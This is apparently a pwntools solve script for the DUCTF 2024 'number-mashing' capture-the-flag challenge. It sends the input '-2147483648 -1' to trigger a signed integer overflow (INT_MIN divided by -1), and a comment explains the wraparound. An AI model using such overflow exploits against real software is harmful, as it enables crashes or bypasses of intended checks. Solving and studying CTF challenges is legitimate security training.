#!/usr/bin/env python3

from pwn import *

exe = ELF("./number-mashing_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("2024.ductf.dev", 30014)

    return r


def main():
    r = conn()
    r.sendline(b'-2147483648 -1') #2147483647 is the maximum integer value if we add 1 it goes back to
                                  #the lowest value which is -2147483648 so after dividing the lowest value
                                  #by -1 it becomes 2147483648=-2147483648=a  
    print(r.recvline())

if __name__ == "__main__":
    main()
